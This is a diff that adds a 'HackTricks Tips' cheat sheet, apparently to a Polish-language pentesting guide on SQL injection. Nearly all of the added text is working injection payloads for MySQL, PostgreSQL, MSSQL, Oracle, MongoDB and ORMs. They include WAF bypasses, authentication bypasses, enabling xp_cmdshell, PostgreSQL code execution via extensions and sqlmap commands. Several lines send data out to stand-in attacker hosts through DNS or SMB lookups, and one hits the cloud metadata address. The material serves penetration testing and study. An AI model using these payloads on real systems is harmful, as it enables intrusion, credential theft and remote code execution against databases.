@@ -201,3 +201,64 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.2.4 | Injection Prevention | Verify that data selection or database queries (e.g., SQL, HQL, NoSQL, Cypher) use parameterized queries, ORMs, entity frameworks, or are otherwise protected from SQL Injection and other database injection attacks. This is also relevant when writing stored procedures. |
+
+
+---
+
+## HackTricks Tips
+
+### MySQL
+
+- **WAF bypass — `information_schema` alternatywy**: `mysql.innodb_table_stats`, `sys.x$schema_flattened_keys`, `sys.schema_table_statistics`
+- **WAF bypass — scientific notation**: `-1' or 1.e(1) or '1'='1`
+- **WAF bypass — spacje jako `/**/`**: `'/**/OR/**/SLEEP(5)--/**/-'`
+- **UNION bez przecinków**: `-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#`
+- **Bypass kolumn (no column names)**: `select (select 1,'flaf') = (SELECT * from demo limit 1);`
+- **Error-based via `updatexml()`**: `updatexml(null,concat(0x7e,(SELECT secret FROM tbl LIMIT 1),0x7e,'///'),null)`
+- **GBK multi-byte auth bypass**: `%bf' or 1=1 -- --`
+- **Raw MD5 bypass**: string `ffifdyop` → hash zawiera `' or '6...`
+- **INSERT ON DUPLICATE KEY UPDATE**: nadpisanie hasła admina przez duplikat email
+- **SSRF via `LOAD_FILE()`**: `SELECT LOAD_FILE(CONCAT('\\\\',secret,'.attacker.com\\a'))`
+
+### PostgreSQL
+
+- **Dump DB w jednym wierszu**: `SELECT query_to_xml('select * from pg_user',true,true,'')` lub `database_to_xml(true,true,'')`
+- **Hex bypass filtrów**: `select query_to_xml(convert_from('\x{hex}','UTF8'),true,true,'')`
+- **No-quote via dollar-quoting**: `SELECT $$hacktricks$$` lub `$TAG$value$TAG$`
+- **RCE via extensions (.so)**: upload przez `pg_largeobject` + `lo_export`, load z path traversal `'../data/poc'`
+- **OOB exfil via `dblink_connect`**: exfil przez connection string username
+
+### MSSQL
+
+- **AD user enumeration**: `SELECT SUSER_SNAME(0x{domain_SID}{user_id})` — brute 1000-2000
+- **Full schema JSON**: `' union select null,(select * from information_schema.columns for json auto),null--`
+- **WAF bypass**: `%C2%85` (NEL) / `%C2%A0` (NBSP) jako spacja; `0eunion select`; `from.table` (kropka zamiast spacji)
+- **Enable xp_cmdshell jednym payloadem**: `exec('sp_configure''xp_cmdshell'',''1''reconfigure')`
+- **SSRF via `fn_xe_file_target_read_file`**: exfil przez burp.net w parametrze ścieżki
+
+### Oracle
+
+- **DNS OOB**: `SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker.oob',80) FROM dual`
+- **Full HTTP via `UTL_HTTP`**: `select UTL_HTTP.request('http://169.254.169.254/...') from dual`
+- **OOB XXE w UNION**: `EXTRACTVALUE(xmltype('<!DOCTYPE...'),'/l') FROM dual--`
+
+### NoSQL (MongoDB)
+
+- **Auth bypass**: `{"username":{"$ne":null},"password":{"$ne":null}}`
+- **Blind regex**: `{"username":"admin","password":{"$regex":"^m"}}`
+- **`$where` error-based**: `{"$where":"if(this._id>'...')throw new Error(JSON.stringify(this))"}`
+- **`$lookup` cross-collection pivot** w `aggregate()`
+- **PHP MongoLite `$func`**: `{"user":{"$func":"var_dump"}}` → arbitrary PHP callback
+
+### ORM Injection
+
+- **Django `filter(**data)` brute**: `{"password__startswith":"a"}` — iteruj prefix
+- **Django relational traversal**: `{"created_by__user__password__contains":"pbkdf2"}`
+- **Prisma type-confusion**: `{"resetToken":{"not":"E"}}` — operator zamiast stringa
+- **Ransack (Ruby) token brute**: `GET /posts?q[user_reset_password_token_start]=0`
+
+### SQLMap tips
+
+- **Second-order**: `sqlmap -r login.txt -p username --second-url "http://target/profile"`
+- **Flask signed cookie**: `--eval "from flask_unsign import session as s; session=s.sign({...})"`
+- **WAF tampers**: `versionedmorekeywords`, `space2comment`, `unmagicquotes`, `luanginxmore` (4.2M dummy params)
